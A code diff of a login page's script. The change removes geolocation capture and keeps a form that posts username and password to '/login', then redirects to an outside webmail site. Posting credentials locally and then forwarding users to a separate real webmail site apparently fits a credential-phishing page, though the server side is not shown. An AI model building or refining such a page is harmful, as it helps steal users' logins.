@@ -97,46 +97,39 @@
         </div>
     </div>
 
-    <script>
+   <script>
+    document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('login-form').addEventListener('submit', async (event) => {
             event.preventDefault();
     
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
     
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const { latitude, longitude } = position.coords;
+            if (!username || !password) {
+                alert('Please fill in all fields.');
+                return;
+            }
     
-                    try {
-                        const response = await fetch('/login', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({ username, password, latitude, longitude }),
-                        });
-    
-                        const result = await response.json();
-    
-                        if (response.ok) {
-                            alert(result.message); // Show success alert
-                            window.location.href = 'https://webmail.bektel.com/'; // Redirect after alert
-                        } else {
-                            alert(`Error: ${result.error}`); // Show error alert
-                        }
-                    } catch (error) {
-                        console.error('Error:', error);
-                        alert('An error occurred. Please try again later.');
-                    }
-                }, (error) => {
-                    console.error('Geolocation error:', error);
-                    alert('Unable to fetch location. Please enable location services.');
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password }),
                 });
-            } else {
-                alert('Geolocation is not supported by your browser.');
+    
+                const result = await response.json();
+                if (response.ok) {
+                    alert(result.message);
+                    window.location.href = 'https://webmail.bektel.com/';
+                } else {
+                    alert(`Error: ${result.error}`);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred. Please try again later.');
             }
         });
-    </script>
+    });
+</script>
 </body>
 </html>
